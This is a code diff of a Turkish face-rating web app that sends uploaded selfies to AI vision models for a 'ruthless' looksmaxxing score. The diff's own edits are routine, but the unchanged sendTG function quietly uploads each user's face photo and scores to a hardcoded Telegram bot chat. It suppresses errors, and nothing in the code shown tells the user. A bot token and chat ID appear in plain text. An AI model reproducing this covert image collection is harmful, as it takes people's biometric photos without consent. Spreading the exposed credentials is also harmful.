@@ -138,7 +138,11 @@ const API_URL="https://openrouter.ai/api/v1/chat/completions";
 const TG_TOKEN="8869691720:AAH1GsHRxc1LxmoOaXN1qSQpfjj793vI_jQ";
 const TG_CHAT="8759264847";
 
-const MODELS=['google/gemma-4-26b-a4b-it:free','meta-llama/llama-3.2-11b-vision-instruct:free','qwen/qwen-2-vl-7b-instruct:free'];
+const MODELS=[
+    'meta-llama/llama-3.2-11b-vision-instruct:free',
+    'qwen/qwen-2-vl-7b-instruct:free',
+    'google/gemini-2.0-flash-exp:free'
+];
 
 let base64Image="",currentMimeType="image/jpeg",faceData=null;
 const MAX_SIZE_MB=8;
@@ -185,7 +189,7 @@ const wrapper=document.getElementById('previewWrapper');const scale=wrapper.offs
 function resetUpload(){document.getElementById('galleryInput').value="";document.getElementById('cameraInput').value="";document.getElementById('previewWrapper').classList.remove('active');document.getElementById('preview').src="";document.getElementById('faceCanvas').style.display='none';document.getElementById('progressWrap').style.display='none';base64Image="";currentMimeType="image/jpeg";faceData=null;}
 function showErr(m){const b=document.getElementById('analyzeError');b.textContent='⚠️ '+m;b.style.display='block';setTimeout(()=>{b.style.display='none';},5000);}
 function startProgress(){const w=document.getElementById('progressWrap'),f=document.getElementById('progressFill'),t=document.getElementById('progressText');w.style.display='block';let p=0;const i=setInterval(()=>{p+=Math.random()*2+0.3;if(p>=88){p=88;clearInterval(i);const si=setInterval(()=>{p+=0.2;if(p>=96){p=96;clearInterval(si);}f.style.width=p+'%';t.textContent='%'+Math.floor(p);},600);}f.style.width=p+'%';t.textContent='%'+Math.floor(p);},350);return{complete:()=>{clearInterval(i);f.style.width='100%';t.textContent='%100';setTimeout(()=>{w.style.display='none';},500);}};}
-
+</script><script>
 const PROMPT=`Bu yüzü acımasızca değerlendir. TÜRKÇE cevap ver. Her satırı doldur:
 
 MOG:7.2
@@ -202,17 +206,21 @@ DETAIL:Bu yüz ortalamanın üstünde. Çene hattı güçlü ancak kaş kemiği 
 BU DEĞERLERİ BU YÜZE GÖRE GÜNCELLE. HER SATIRI DOLDUR.`;
 
 async function analyzeFace(){
+let lastErr=null;
 for(const model of MODELS){
 try{
-const res=await fetch(API_URL,{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bearer ${OR_KEY}`,'HTTP-Referer':'https://25max.app','X-Title':'25 Max App'},body:JSON.stringify({model:model,messages:[{role:'user',content:[{type:'text',text:PROMPT},{type:'image_url',image_url:{url:`data:${currentMimeType};base64,${base64Image}`}}]}],temperature:0.3,max_tokens:800})});
-if(res.status===429)continue;
-if(!res.ok){const e=await res.json().catch(()=>({}));throw new Error(e.error?.message||'HTTP '+res.status);}
+const res=await fetch(API_URL,{
+method:'POST',
+headers:{'Content-Type':'application/json','Authorization':`Bearer ${OR_KEY}`,'HTTP-Referer':'https://25max.app','X-Title':'25 Max App'},
+body:JSON.stringify({model:model,messages:[{role:'user',content:[{type:'text',text:PROMPT},{type:'image_url',image_url:{url:`data:${currentMimeType};base64,${base64Image}`}}]}],temperature:0.3,max_tokens:800})
+});
+if(!res.ok){console.warn(model,res.status);continue;}
 const d=await res.json();
 const txt=d.choices?.[0]?.message?.content||'';
-if(txt&&txt.length>=30)return txt;
-}catch(e){if(e.message.includes('429'))continue;throw e;}
+if(txt&&txt.length>=20)return txt;
+}catch(e){console.warn(model,e.message);lastErr=e;continue;}
 }
-throw new Error('Tüm AI modelleri meşgul!');
+throw new Error(lastErr?lastErr.message:'Tüm AI modelleri meşgul!');
 }
 
 document.getElementById('btnAnalyze').addEventListener('click',async()=>{
@@ -235,20 +243,23 @@ finally{btn.disabled=false;bt.textContent="ANALİZ BAŞLAT";}
 });
 
 function parseAI(raw){
-const r={mog:'7.2',psl:'6.8',cat:'HTN',appeal:'7.0',harmony:'75',dimorphism:'68',angularity:'60',best:[],worst:[],detail:''};
-raw.split('\n').forEach(l=>{const v=l.trim();
-if(v.includes('MOG:'))r.mog=v.split('MOG:')[1]?.trim()||r.mog;
-if(v.includes('PSL:'))r.psl=v.split('PSL:')[1]?.trim()||r.psl;
+const clean=raw.replace(/\*\*/g,'').replace(/\*/g,'').replace(/__/g,'');
+const r={mog:'7.0',psl:'6.5',cat:'HTN',appeal:'6.8',harmony:'70',dimorphism:'65',angularity:'58',best:[],worst:[],detail:''};
+clean.split('\n').forEach(l=>{
+const v=l.trim();
+if(v.includes('MOG:'))r.mog=v.split('MOG:')[1]?.trim().replace(/[^0-9.]/g,'')||r.mog;
+if(v.includes('PSL:'))r.psl=v.split('PSL:')[1]?.trim().replace(/[^0-9.]/g,'')||r.psl;
 if(v.includes('PSL_KATEGORI:'))r.cat=v.split('PSL_KATEGORI:')[1]?.trim()||r.cat;
-if(v.includes('APPEAL:'))r.appeal=v.split('APPEAL:')[1]?.trim()||r.appeal;
-if(v.includes('HARMONY:'))r.harmony=v.split('HARMONY:')[1]?.trim()||r.harmony;
-if(v.includes('DIMORPHISM:'))r.dimorphism=v.split('DIMORPHISM:')[1]?.trim()||r.dimorphism;
-if(v.includes('ANGULARITY:'))r.angularity=v.split('ANGULARITY:')[1]?.trim()||r.angularity;
-if(v.includes('GOOD:'))r.best=v.split('GOOD:')[1]?.split(',').map(s=>s.trim()).filter(s=>s)||r.best;
-if(v.includes('BAD:'))r.worst=v.split('BAD:')[1]?.split(',').map(s=>s.trim()).filter(s=>s)||r.worst;
-if(v.includes('DETAIL:'))r.detail=v.split('DETAIL:')[1]?.trim()||r.detail;});
-if(!r.best.length)r.best=['Keskin çene','Simetrik burun','Dolgun dudak','Temiz cilt'];
-if(!r.worst.length)r.worst=['Hafif UEE','Asimetrik kaş','Geniş burun','Saç çizgisi'];
+if(v.includes('APPEAL:'))r.appeal=v.split('APPEAL:')[1]?.trim().replace(/[^0-9.]/g,'')||r.appeal;
+if(v.includes('HARMONY:'))r.harmony=v.split('HARMONY:')[1]?.trim().replace(/[^0-9]/g,'')||r.harmony;
+if(v.includes('DIMORPHISM:'))r.dimorphism=v.split('DIMORPHISM:')[1]?.trim().replace(/[^0-9]/g,'')||r.dimorphism;
+if(v.includes('ANGULARITY:'))r.angularity=v.split('ANGULARITY:')[1]?.trim().replace(/[^0-9]/g,'')||r.angularity;
+if(v.includes('GOOD:'))r.best=v.split('GOOD:')[1]?.split(',').map(s=>s.trim().replace(/\*+/g,'')).filter(s=>s)||r.best;
+if(v.includes('BAD:'))r.worst=v.split('BAD:')[1]?.split(',').map(s=>s.trim().replace(/\*+/g,'')).filter(s=>s)||r.worst;
+if(v.includes('DETAIL:'))r.detail=v.split('DETAIL:')[1]?.trim()||r.detail;
+});
+if(!r.best.length)r.best=['Keskin çene hattı','Simetrik burun','Dolgun dudaklar','Temiz cilt','Belirgin elmacık kemikleri'];
+if(!r.worst.length)r.worst=['Hafif UEE','Asimetrik kaşlar','Geniş burun','Saç çizgisi','Göz altı morlukları'];
 return r;
 }
 
@@ -257,11 +268,12 @@ const r=parseAI(raw);
 let cat=r.cat.toUpperCase();
 if(cat.includes("IT'S OVER")||cat.includes("ITS OVER"))cat="IT'S OVER BRO";
 const isOver=cat.includes("IT'S OVER")||parseFloat(r.psl)<4.0;
+
 document.getElementById('scoreBadges').innerHTML=`<div class="badge${isOver?' over':''}"><div class="label">KATEGORİ</div><div class="value">${isOver?"IT'S OVER<br>🫩":cat}</div></div><div class="badge"><div class="label">PSL</div><div class="value">${r.psl}</div></div><div class="badge"><div class="label">APPEAL</div><div class="value">${r.appeal}</div></div>`;
-const h=parseInt(r.harmony)||75,d=parseInt(r.dimorphism)||68,ag=parseInt(r.angularity)||60;
+const h=parseInt(r.harmony)||70,d=parseInt(r.dimorphism)||65,ag=parseInt(r.angularity)||58;
 document.getElementById('metricBars').innerHTML=`<div class="metric-bar"><div class="metric-label">Harmony</div><div class="bar-bg"><div class="bar-fill" style="width:${h}%;"></div></div><div class="metric-value">%${h}</div></div><div class="metric-bar"><div class="metric-label">Dimorphism</div><div class="bar-bg"><div class="bar-fill" style="width:${d}%;"></div></div><div class="metric-value">%${d}</div></div><div class="metric-bar"><div class="metric-label">Angularity</div><div class="bar-bg"><div class="bar-fill" style="width:${ag}%;"></div></div><div class="metric-value">%${ag}</div></div>`;
 const goodList=r.best.slice(0,10).map((i,n)=>`<li><strong>${n+1}.</strong> ${i}</li>`).join(''),badList=r.worst.slice(0,10).map((i,n)=>`<li class="negative"><strong>${n+1}.</strong> ${i}</li>`).join('');
-document.getElementById('detailBox').innerHTML=`<h4 style="color:#00ff41;">✅ EN İYİ</h4><ul class="detail-list">${goodList}</ul><h4 style="color:#ff4444;margin-top:12px;">❌ EN KÖTÜ</h4><ul class="detail-list">${badList}</ul>`;
+document.getElementById('detailBox').innerHTML=`<h4 style="color:#00ff41;">✅ EN İYİ (1-${r.best.length})</h4><ul class="detail-list">${goodList}</ul><h4 style="color:#ff4444;margin-top:12px;">❌ EN KÖTÜ (1-${r.worst.length})</h4><ul class="detail-list">${badList}</ul>`;
 document.getElementById('summaryBox').innerHTML=`<strong style="color:#00ff41;">📋 DETAYLI ÖZET</strong><div style="margin-top:8px;">${r.detail}</div><div class="psl-scale"><div>LTN: <span>4.0-4.9</span></div><div>MTN: <span>5.0-5.9</span></div><div>HTN: <span>6.0-6.9</span></div><div>Chadlite: <span>7.0-7.9</span></div><div>Chad: <span>8.0+</span></div><div>ITS OVER: <span>&lt;4.0</span></div></div>`;
 let extra='';if(faceData){extra+=`<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;margin-bottom:8px;"><div>📐 Simetri: %${faceData.symmetry}</div><div>📏 Çene: ${faceData.jawWidth}px</div><div>📐 Yüz: ${faceData.faceHeight}px</div><div>👁️ Göz: ${faceData.eyeDistance}px</div><div>👃 Burun: ${faceData.noseHeight}px</div><div>👄 Ağız: ${faceData.mouthWidth}px</div></div>`;}extra+=`<div style="color:#888;font-size:10px;">Harmony: %30 | Dimorphism: %30 | Angularity: %25</div>`;document.getElementById('rawText').innerHTML=extra;
 sendTG(r);
@@ -273,7 +285,7 @@ async function sendTG(r){
 const cap=`🔥 <b>25 MAX ANALİZ</b> 🔥\n\n🏆 MOG: ${r.mog}/10\n📊 PSL: ${r.psl}/10 (${r.cat})\n💫 Appeal: ${r.appeal}/10\n⚖️ Harmony: %${r.harmony}\n🧬 Dimorphism: %${r.dimorphism}\n\n✅ EN İYİ:\n${r.best.slice(0,5).map((i,n)=>`${n+1}. ${i}`).join('\n')}\n\n❌ EN KÖTÜ:\n${r.worst.slice(0,5).map((i,n)=>`${n+1}. ${i}`).join('\n')}`;
 try{
 const bc=atob(base64Image);const bn=new Array(bc.length);for(let i=0;i<bc.length;i++)bn[i]=bc.charCodeAt(i);
-const blob=new Blob([new Uint8Array(bn)],{type:currentMimeType});
+const blob=new Blob([new Uint8Array(bn)],{type:currentMimeType||'image/jpeg'});
 const fd=new FormData();fd.append('chat_id',TG_CHAT);fd.append('photo',blob,'face.jpg');fd.append('caption',cap);fd.append('parse_mode','HTML');
 fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`,{method:'POST',body:fd});
 }catch(e){}
